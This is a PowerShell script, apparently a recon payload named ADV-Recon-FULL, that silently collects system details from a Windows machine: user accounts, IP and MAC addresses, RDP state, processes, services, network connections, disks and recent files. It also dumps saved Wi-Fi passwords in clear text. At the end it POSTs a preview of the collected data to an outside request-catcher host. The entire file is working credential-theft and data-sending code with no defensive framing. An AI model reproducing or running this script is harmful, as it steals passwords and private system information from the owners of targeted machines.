
# ========== ADV-Recon-FULL.ps1 ==========
Set-Variable -Name output -Value "" -Scope Global

function Add-ToOutput {
    param([string]$Title, [object]$Data)
    $Global:output += "`n===== [$Title] =====`n"
    $Global:output += "$($Data | Out-String)`n"
}

# System Info
Add-ToOutput "PowerShell Version" $PSVersionTable.PSVersion
Add-ToOutput "Current User" (whoami)
try { $os = Get-CimInstance Win32_OperatingSystem; Add-ToOutput "OS" "$($os.Caption) $($os.Version)" } catch { Add-ToOutput "OS" $_.Exception.Message }
try { $bios = Get-CimInstance Win32_BIOS; Add-ToOutput "BIOS Serial" $bios.SerialNumber } catch { Add-ToOutput "BIOS Serial" $_.Exception.Message }

# Local Users
try { $users = Get-LocalUser | Select-Object Name, Enabled, LastLogon; Add-ToOutput "Local Users" $users } catch { Add-ToOutput "Local Users" $_.Exception.Message }

# Network Info
try { $pubIP = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim(); Add-ToOutput "Public IP" $pubIP } catch { Add-ToOutput "Public IP" $_.Exception.Message }
try { $localIPs = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "169.*"}; Add-ToOutput "Local IPs" $localIPs } catch { Add-ToOutput "Local IPs" $_.Exception.Message }
try { $macs = Get-NetAdapter | Select-Object Name, MacAddress, Status; Add-ToOutput "MAC Addresses" $macs } catch { Add-ToOutput "MAC Addresses" $_.Exception.Message }
try { $rdp = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"; $rdpstate = if ($rdp.fDenyTSConnections -eq 0) {"Enabled"} else {"Disabled"}; Add-ToOutput "RDP" $rdpstate } catch { Add-ToOutput "RDP" $_.Exception.Message }

# Wi-Fi Profiles
try {
    $wifi = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $profile = $_ -replace ".*: ", ""
        $key = (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content").ToString().Split(":")[-1].Trim()
        [PSCustomObject]@{Profile=$profile;Password=$key}
    }
    Add-ToOutput "Wi-Fi Profiles" $wifi
} catch { Add-ToOutput "Wi-Fi Profiles" $_.Exception.Message }

# Processes, Services, Drivers
try { $procs = Get-Process | Sort-Object ProcessName | Select-Object -First 20 ProcessName, Id, CPU; Add-ToOutput "Running Processes (Top 20)" $procs } catch { Add-ToOutput "Processes" $_.Exception.Message }
try { $services = Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -First 20 Name, DisplayName; Add-ToOutput "Running Services (Top 20)" $services } catch { Add-ToOutput "Services" $_.Exception.Message }
try { $drivers = Get-WmiObject Win32_PnPSignedDriver | Select-Object -First 10 DeviceName, DriverVersion; Add-ToOutput "Drivers (Top 10)" $drivers } catch { Add-ToOutput "Drivers" $_.Exception.Message }

# Network Connections
try { $tcp = Get-NetTCPConnection | Select-Object -First 20 LocalAddress, LocalPort, RemoteAddress, RemotePort, State; Add-ToOutput "TCP Connections (Top 20)" $tcp } catch { Add-ToOutput "TCP Connections" $_.Exception.Message }

# Disk Info
try { $disks = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FileSystem, VolumeName, @{Name="Size(GB)";Expression={[math]::round($_.Size/1GB,2)}}, @{Name="FreeSpace(GB)";Expression={[math]::round($_.FreeSpace/1GB,2)}}; Add-ToOutput "Drives" $disks } catch { Add-ToOutput "Drives" $_.Exception.Message }

# Recent Files
try {
    $recent = Get-ChildItem -Path $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 10 FullName, LastWriteTime
    Add-ToOutput "Recent Files (10)" $recent
} catch { Add-ToOutput "Recent Files" $_.Exception.Message }

# Debug + POST
Write-Host "`n========== DEBUG =========="
Write-Host "OUTPUT LENGTH: $($Global:output.Length)"
Write-Host "OUTPUT CONTENT:"
Write-Host $Global:output
Write-Host "==========================="

try {
    $preview = $Global:output.Substring(0, [Math]::Min(500, $Global:output.Length))
    $body = @{ debug = $preview }
    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body $body -UseBasicParsing
    Write-Host "`nPOST sent successfully!"
} catch {
    Write-Host "`nPOST FAILED: $($_.Exception.Message)"
}
